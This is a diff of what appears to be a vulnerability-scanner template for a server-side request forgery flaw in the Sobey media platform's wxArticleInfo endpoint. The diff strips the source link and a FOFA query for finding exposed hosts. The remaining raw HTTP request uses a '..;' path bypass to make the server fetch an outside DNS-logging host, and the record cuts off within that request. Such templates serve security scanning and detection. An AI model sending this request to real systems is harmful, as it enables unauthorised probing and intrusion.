@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体系统wxArticleInfo存在SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cxxqn0mvacdmg4x0'
+  description: ''
   tags: ssrf,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cxxqn0mvacdmg4x0
-    fofa: body="/Sc-TaskMonitoring/"
 http:
 - raw:
   - 'GET /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=1&token=1&wxurl=http://dnslog.org HTTP/1.1
